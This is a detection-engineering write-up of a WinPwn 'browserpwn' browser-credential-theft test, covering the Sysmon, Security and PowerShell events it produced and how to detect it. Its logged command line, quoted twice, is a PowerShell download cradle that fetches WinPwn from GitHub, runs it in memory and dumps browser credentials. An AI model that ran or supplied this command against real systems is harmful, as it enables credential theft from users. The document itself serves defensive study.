# T1555.003-11: Credentials from Web Browsers — WinPwn BrowserPwn

## Technique Context

T1555.003 covers credential theft from web browsers. This test uses the WinPwn PowerShell post-exploitation framework's `browserpwn` function, which targets saved browser credentials across Chromium-based browsers (Chrome, Edge) and Firefox. WinPwn consolidates multiple credential theft techniques behind a single PowerShell framework — the `browserpwn` function handles browser credential access in a similar scope to what T1555.003-10 accomplishes with the manual staging script, but automated within the framework.

The test downloads WinPwn at runtime using `iex(new-object net.webclient).downloadstring(...)` — a download cradle that loads the entire framework into memory without writing to disk — then immediately invokes `browserpwn -consoleoutput -noninteractive`. The `-noninteractive` flag suppresses prompts for automated execution.

WinPwn's `browserpwn` function typically copies browser credential databases, decrypts DPAPI-protected entries using the current user context, and outputs credentials in plaintext. Running as SYSTEM (as in this test) provides access to all user profiles on the system.

This test ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 146 total events: 30 Sysmon events, 112 PowerShell operational events, 3 Security events, and 1 Application event.

**Sysmon EID 1 (Process Create)** captures three events. The primary attack command:

```
CommandLine: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
RuleName: technique_id=T1059.001,technique_name=PowerShell
```

Two `whoami.exe` identity checks (before and after the attack) also appear as Sysmon EID 1. The second `whoami` at 17:23:07 (approximately 9 seconds after the `powershell.exe` launch at 17:22:57) indicates the WinPwn `browserpwn` function ran for roughly 9 seconds before the test framework continued.

**Security EID 4688** captures three process creation events (fewer than the 4 in other T1555 tests, as the cleanup step may not have generated a separate EID 4688 here):

```
Process Command Line: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive}
```

**Sysmon EID 3 (Network Connection)** captures two network events — this is the only test in the T1555.003 batch where network connection events appear in the sample:

```
UtcTime: 2026-03-17 17:22:54.652
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MpDefenderCoreService.exe
DestinationIp: 52.123.128.14
DestinationPort: 443
```

```
UtcTime: 2026-03-17 17:23:00.380
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId: 15580
SourceIp: 192.168.4.16
DestinationIp: 185.199.109.133
DestinationPort: 443
```

The first network event is from `MpDefenderCoreService.exe` (Defender's core service) connecting to `52.123.128.14:443` — a Microsoft cloud service connection, likely Defender's telemetry or cloud protection endpoint. This event is tagged `technique_id=T1036,technique_name=Masquerading` by the Sysmon ruleset because Defender's process path matches a broad DLL hijacking/masquerading rule pattern.

The second network event is the critical one: PowerShell (PID 15580, the same process that executes `browserpwn`) connecting to `185.199.109.133:443` — the GitHub CDN IP range for `raw.githubusercontent.com`. This is the WinPwn framework download in progress, captured at the TCP connection level approximately 3 seconds after the process starts.

**Sysmon EID 7 (Image Load)** captures 17 events (fewer than the 25 in T1555-6/7/8, reflecting fewer DLL loads overall). **EID 10 (Process Access)** captures 3 events. **EID 17 (Pipe Create)** captures 2 events. **EID 11 (File Create)** captures 2 events.

The first EID 11 event shows PowerShell (PID 15580) writing startup profile data:

```
TargetFilename: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
```

The second EID 11 shows `MsMpEng.exe` creating a temp file:

```
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MsMpEng.exe
TargetFilename: C:\Windows\Temp\01dcb632b8a518e3
```

Even with Defender disabled, `MsMpEng.exe` (the Windows Defender antimalware engine) remains present and active at a reduced level, writing temporary files related to its background operations.

**PowerShell EID 4104** captures 109 script block events with 2 EID 4103 module logging events and 1 EID 4100 error event. Notable script blocks captured in the sample include `Set-ExecutionPolicy Bypass -Scope Process -Force` and the ART cleanup invocation: `Invoke-AtomicTest T1555.003 -TestNumbers 11 -Cleanup -Confirm:$false`.

**Sysmon EID 22 (DNS Query)** is confirmed in the eid_breakdown (1 event) but is outside the 20-event sample window.

## What This Dataset Does Not Contain

**The `browserpwn` function body is not in sampled script block logs.** The WinPwn framework code is loaded in-memory via `iex`, so the script block would appear in EID 4104 in the non-sampled events.

**No browser-specific file access events.** Unlike T1555.003-10, there are no Sysmon EID 11 events showing copies of Chrome `Login Data` or Firefox `key4.db` — either the `browserpwn` function operates differently than the manual staging script, or those file operations occurred but fell outside the sample window.

**No credential output.** The plaintext credentials (if any) returned by `browserpwn` are not recorded in any event channel.

**No process access events for browser processes.** If `browserpwn` reads browser data from running browser processes (rather than from profile files), Sysmon EID 10 events targeting Chrome or Edge would appear. The 3 EID 10 events in this dataset are likely from PowerShell's standard process spawning mechanics.

## Assessment

T1555.003-11 provides the most complete network connection evidence in the T1555.003 batch — both the Defender telemetry connection and the PowerShell-to-GitHub download are captured in the sampled events (rather than only in the eid_breakdown). The PowerShell → `185.199.109.133:443` connection event is particularly valuable: it confirms the download from the GitHub CDN and links the network connection to the specific PowerShell process (PID 15580) executing `browserpwn`.

The 9-second window between the PowerShell launch and the subsequent `whoami.exe` check (17:22:57 to 17:23:07) suggests `browserpwn` ran for approximately 9 seconds. By comparison, other WinPwn modules in this batch appear to complete more quickly based on the event timing. This extended execution time could reflect `browserpwn` actually scanning browser profile directories, finding or not finding credential files, and attempting DPAPI decryption operations.

Compared to the defended variant (43 Sysmon, 51 PowerShell, 16 Security), the undefended run has substantially fewer Sysmon events (30 vs 43) and Security events (3 vs 16). The defended variant's higher Security event count likely includes Defender's remediation process creations (EID 4688 for Defender tools) that are absent when Defender is disabled. The presence of `MsMpEng.exe` activity in the undefended dataset confirms Defender is partially active even when disabled — real-time protection is off but the engine process continues running.

## Detection Opportunities Present in This Data

**Sysmon EID 3 (Network Connection)** directly capturing the PowerShell process (PID 15580) connecting to `185.199.109.133:443` (GitHub CDN) is the most actionable detection event in this dataset. The connection occurs within 3 seconds of the process launch and before the credential access begins. A SYSTEM-context PowerShell process initiating an outbound HTTPS connection to GitHub CDN IPs immediately warrants investigation.

**Sysmon EID 1** and **Security EID 4688** capture the full command line with `browserpwn` as the explicit function name, the WinPwn URL, and the commit hash.

**PowerShell EID 4104** would contain the `browserpwn` function implementation loaded from WinPwn, including file path patterns for browser credential databases.

**Sysmon EID 22** (confirmed in eid_breakdown) would show the DNS query for `raw.githubusercontent.com` resolving to the GitHub CDN IPs — the DNS resolution precedes the TCP connection and provides an earlier detection opportunity than the EID 3 connection event.

The `MsMpEng.exe` EID 11 event (`C:\Windows\Temp\01dcb632b8a518e3`) provides an interesting contextual data point: even with Defender disabled, the engine writes temp files during unusual activity. This is not a reliable detection source but demonstrates that Defender's background processes remain observable in the event log even in a "disabled" state.

The combination of a WinPwn download cradle followed by 9 seconds of execution followed by a `whoami` call is a specific behavioral cluster. The timing gap — which would appear as a 9-second window between the PowerShell process creation and the next `whoami` — could serve as a temporal detection indicator when correlated with the preceding download cradle.
